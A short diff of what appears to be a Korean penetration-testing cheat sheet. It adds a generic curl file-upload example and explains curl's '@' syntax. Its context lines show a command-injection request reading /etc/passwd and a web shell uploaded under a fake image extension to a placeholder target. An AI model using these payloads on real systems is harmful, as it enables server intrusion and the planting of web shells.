@@ -101,6 +101,9 @@ curl -X POST "http://target.com/execute?cmd=cat+/etc/passwd"
 
 # 파일 업로드 취약점 (확장자 우회)
 curl -X POST -F "file=@webshell.php;filename=image.jpg;type=image/jpeg" http://target.com/upload
+curl -F "file=@/경로/파일명" http://타겟IP/upload.php
+`@`는 curl에서 파일 업로드할 때 로컬 파일임을 나타내는 표시입니다. `-F` 옵션과 함께 사용합니다.
+
 ```
 
 ### 인증 우회 및 세션 작업
